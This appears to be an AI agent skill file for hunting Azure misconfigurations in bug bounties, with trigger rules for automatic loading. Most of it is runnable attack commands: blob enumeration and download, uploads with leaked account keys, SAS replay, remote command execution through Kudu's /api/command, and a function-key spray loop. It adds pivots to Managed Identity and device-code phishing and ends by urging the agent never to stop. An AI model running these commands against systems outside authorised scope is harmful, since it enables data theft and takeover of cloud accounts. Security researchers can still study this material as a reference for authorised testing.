---
name: hunt-azure-misconfig
description: "Use this skill when you see *.blob.core.windows.net, *.queue.core.windows.net, *.file.core.windows.net, *.table.core.windows.net, *.azurewebsites.net, *.azureedge.net, *.azurefd.net, *.cloudapp.net, *.servicebus.windows.net URLs, SAS tokens (sv=&sig=) in JS/responses, scope mentions Azure / O365, or DNS reveals Azure IP ranges. Load automatically when subdomain enum surfaces Azure-fronted assets. Only invoke if real impact potential exists — public container with sensitive blobs, overly permissive SAS, dangling azurewebsites.net subdomain, exposed Kudu/SCM, leaked storage account key. Skip theoretical findings."
type: hunt
---

# Hunt: Azure Storage & Azure Infrastructure Misconfiguration

Azure misconfigs revolve around four primitives: public blob containers, overly-permissive SAS tokens, dangling `*.azurewebsites.net` subdomains, and exposed App Service deployment surfaces (Kudu/SCM). All four pay well because they often hold backups, secrets, or full deployment control.

## Crown Jewel Targets
- Blob containers with `PublicAccessLevel: Container` (full list + read) holding backups, configs, KYC
- Storage accounts with leaked account key (full plane access — read, write, delete on every container)
- SAS URLs with `rwdlacup` permissions and multi-year expiry on `/` resource
- Dangling `*.azurewebsites.net` / `*.cloudapp.net` CNAMEs (subdomain takeover)
- Exposed Kudu/SCM consoles (`<app>.scm.azurewebsites.net`) without auth — RCE via Debug Console
- App Service `web.config` / `appsettings.json` accessible via path traversal
- Public Azure Function URLs without `function`/`admin` key
- AzureAD device-code phishing surfaces
- Service Bus / Event Hub connection strings in JS

## Detection Signals
- Hostnames: `*.blob.core.windows.net`, `*.queue/file/table.core.windows.net`, `*.azurewebsites.net`, `*.scm.azurewebsites.net`, `*.azureedge.net`, `*.azurefd.net`
- Response headers: `x-ms-request-id`, `x-ms-version`, `Server: Microsoft-IIS/10.0` on Azure ranges
- SAS in JS: `?sv=2022-11-02&ss=b&srt=co&sp=rwdlacx&se=2030-…&st=…&spr=https&sig=…`
- `<EnumerationResults>` XML response → public container list enabled
- 404 with `BlobNotFound` → container exists; `ContainerNotFound` → check if takeover-able
- `*.azurewebsites.net` returning Azure's default "Your App Service app is up and running" page → dangling app candidate
- `<account>.blob.core.windows.net` returning 400 InvalidQueryParameterValue but valid host → account exists
- Storage account names in source: `AZURE_STORAGE_ACCOUNT`, `STORAGE_CONNECTION_STRING`, `DefaultEndpointsProtocol=https;AccountName=…;AccountKey=…`

## Attack Techniques

1. **Public container list + blob read**
   ```bash
   ACC=targetstorage
   CT=backups
   # List blobs in container
   curl "https://$ACC.blob.core.windows.net/$CT?restype=container&comp=list"
   # Download a blob
   curl "https://$ACC.blob.core.windows.net/$CT/db-backup.bak" -o backup.bak
   ```

2. **Anonymous container probe (without name guessing)**
   ```bash
   for c in backup backups assets uploads files data logs media public private temp tmp images docs config secrets; do
     code=$(curl -s -o /dev/null -w "%{http_code}" "https://$ACC.blob.core.windows.net/$c?restype=container&comp=list")
     [ "$code" = "200" ] && echo "OPEN: $c"
   done
   ```

3. **Leaked storage account key — full plane**
   ```bash
   az storage blob list --account-name $ACC --account-key "$KEY" --container-name $CT
   az storage blob upload --account-name $ACC --account-key "$KEY" \
     --container-name $CT --name h1-poc.txt --file /tmp/poc.txt
   ```
   Account key is the master key — root over the storage account. Found in env files, JS bundles, GitHub leaks.

4. **SAS token abuse**
   - **Decode the SAS** to read permissions and scope:
     `sp=rwdlacx` (read/write/delete/list/add/create/execute), `srt=sco` (service/container/object — all three is max), `ss=bfqt` (blob/file/queue/table — all services), `se=2030-…` (long expiry).
   - **Replay** the SAS against arbitrary blobs by changing the path (signature usually covers only the resource scope, not the exact blob name if `sr=c` container-scoped).
   - **Privilege check** via a benign create operation.
   ```bash
   curl "https://$ACC.blob.core.windows.net/$CT/?restype=container&comp=list&$SAS"
   curl -X PUT "https://$ACC.blob.core.windows.net/$CT/poc.txt?$SAS" \
        -H "x-ms-blob-type: BlockBlob" --data "poc"
   ```

5. **Dangling `*.azurewebsites.net` subdomain takeover**
   Target has CNAME `app.target.com → oldapp.azurewebsites.net`. If `oldapp.azurewebsites.net` no longer exists, register it (must own an Azure subscription) and serve content from the trusted hostname.
   - Detection: `dig CNAME app.target.com` → points at azurewebsites.net, `curl https://oldapp.azurewebsites.net` returns Azure's default "404 Web Site not found".

6. **Kudu / SCM exposure (`<app>.scm.azurewebsites.net`)**
   - If anonymous access or basic-auth creds leaked → Debug Console = full RCE in the App Service container.
   - Endpoints: `/api/zip/site/wwwroot/` (download whole app), `/api/command` (exec), `/DebugConsole/`.
   - `/.publishsettings` and `/<app>.pub.zip` sometimes accessible.

7. **Azure Function URLs**
   - `*.azurewebsites.net/api/<funcname>?code=<host_or_function_key>`
   - Function keys leaked in JS/responses; master `_master` key grants admin.
   - `authLevel:anonymous` functions sometimes proxy internal APIs (SSRF goldmine).

8. **App Service config leak**
   - `web.config`, `appsettings.Production.json`, `local.settings.json` sometimes deployed to wwwroot and reachable directly.
   - `/.env`, `/.git/config`, `/.vscode/settings.json` on App Service.

9. **`*.azureedge.net` / Front Door origin pollution**
   Misconfigured Front Door → host-header SSRF / cache poisoning. Origin host header may be required to reach the real backend.

10. **Azure CDN endpoint takeover**
    Similar to subdomain takeover: dangling `*.azureedge.net` registrations.

## Payloads

```bash
# Storage account audit
ACC=targetstorage
echo "[*] Account exists check"
curl -sI "https://$ACC.blob.core.windows.net/" | head -3
echo "[*] Public container guess"
for c in $(echo backup backups assets uploads files data logs media public private temp config secrets static images videos kyc dumps); do
  r=$(curl -s -o /dev/null -w "%{http_code}" "https://$ACC.blob.core.windows.net/$c?restype=container&comp=list")
  [ "$r" = "200" ] && echo "OPEN container: $c"
done
echo "[*] $web container (Static Website)"
curl -s "https://$ACC.z13.web.core.windows.net/" -o /tmp/web && file /tmp/web
```

```bash
# SAS decoder + permission map
SAS="sv=2022-11-02&ss=bfqt&srt=sco&sp=rwdlacx&se=2030-01-01T00:00:00Z&st=2023-01-01T00:00:00Z&spr=https&sig=..."
for kv in $(echo $SAS | tr '&' ' '); do echo "  $kv"; done
# sp letters: r=read, w=write, d=delete, l=list, a=add, c=create, u=update, p=process, x=execute, i=immutable
```

```bash
# Storage account key validation (use locally if key surfaces)
az storage account show --name $ACC --query "{name:name, location:location, sku:sku.name}"
az storage container list --account-name $ACC --account-key "$KEY" --output table
```

```bash
# Dangling azurewebsites.net detection
for s in $(cat subs.txt | grep azurewebsites.net); do
  body=$(curl -s "https://$s/")
  echo "$body" | grep -q "404 Web Site not found" && echo "DANGLING: $s"
done
```

```bash
# Kudu probe
APP=targetapp
curl -sI "https://$APP.scm.azurewebsites.net/api/settings"
curl -sI "https://$APP.scm.azurewebsites.net/api/zip/site/wwwroot/"
# With basic-auth creds:
curl -u "\$$APP:DEPLOYPASSWORD" "https://$APP.scm.azurewebsites.net/api/command" \
  -H "Content-Type: application/json" \
  -d '{"command":"whoami","dir":"site\\wwwroot"}'
```

```bash
# Azure Function key spray
FN=targetfunc
for k in $(cat keys.txt); do
  r=$(curl -s -o /dev/null -w "%{http_code}" "https://$FN.azurewebsites.net/api/myfunc?code=$k")
  [ "$r" = "200" ] && echo "VALID: $k"
done
```

## Bypass Methods
- Container-level public access disabled but blobs marked `PublicAccess:Blob` are still anonymously readable by direct URL (need to know names — scrape JS / sitemap / wayback)
- Storage firewall restricts to VNets → SSRF chain to an Azure-resident host hits the bucket
- SAS signature scope `sr=b` (blob-specific) cannot be replayed on other blobs; `sr=c` (container) can
- Azure AD-protected App Service still leaks `web.config` via path traversal in some app routes
- `*.scm.azurewebsites.net` Easy Auth often misconfigured to allow anonymous to `/api/settings`
- Static Web Apps `*.azurestaticapps.net` have separate auth model — check `staticwebapp.config.json` rules
- Azure CDN strips some headers but caches them in others; cache-key confusion

## Tools
- **az CLI** — `az storage blob list --auth-mode login --account-name …`
- **azcopy** — bulk blob mirror
- **MicroBurst** — https://github.com/NetSPI/MicroBurst — PowerShell Azure attack toolkit (storage enum, blob probe, dangling-app)
- **BlobHunter** — https://github.com/CyberArk/BlobHunter — find public blobs across an account
- **cloud_enum --azure** — multi-cloud enum
- **AzureHound** / **ROADtools** — AAD enumeration
- **stormspotter** — Azure attack-graph
- **subdomain-takeover scanners** (subjack, takeover) — detect dangling azurewebsites.net
- **nuclei** templates: `cloud/azure/*`, `takeovers/azure-takeover.yaml`
- **trufflehog azure** — secret scanning across containers

## Impact
- **Critical** — leaked storage account key (full storage RCE-equivalent for data); Kudu RCE on App Service; anonymous WRITE on container serving live app; dangling app takeover hosting attacker content on trusted hostname
- **High** — public container with backups / PII / KYC; SAS with full perms and multi-year expiry on container scope; Function master-key leak; leaked connection strings to Service Bus / Cosmos
- **Medium** — public container with internal-but-non-sensitive data; misconfigured CDN cache; Function key with limited scope
- Empty `$web` container, public images-only container, expired SAS = NOT bounty-worthy.

## Chain Potential
- Storage key leak → mass blob exfil (chain into `cloud-iam-deep` for cross-resource)
- Kudu RCE → exfil `WEBSITE_AUTH_*` env → access to other Azure resources via Managed Identity (chain SSRF to `169.254.169.254`)
- Dangling azurewebsites.net takeover → host content under `*.target.com` → cookie theft, OAuth callback hijack, CORS bypass
- Function `authLevel:anonymous` proxying internal APIs → SSRF / data exfil from internal services
- Public container with `.git/` → source code → secrets → DB access
- SAS with delete perms on backup container → ransomware-style leverage (do NOT actually delete; demonstrate read+list and STOP)

## Fallback Chain
1. Enumerate storage account names from JS bundles, env-leaks, predictable patterns; probe each for public containers via the `?restype=container&comp=list` endpoint.
2. For each accessible container, list blobs, sample for secrets, decode any SAS tokens for permission scope and expiry; if write is allowed, drop a benign PoC and stop.
3. Enumerate `*.azurewebsites.net` / `*.scm.azurewebsites.net` / `*.azurefd.net` for dangling subdomains and exposed Kudu; probe Function endpoints with anonymous and leaked keys.
4. If storage and App Service are locked, pivot to AAD device-code phishing surfaces, Service Bus / Event Hub connection strings in code, Cosmos DB exposed endpoints, leaked `publishsettings` files, or related Azure services via SSRF to Managed Identity — Never stop because one technique failed.
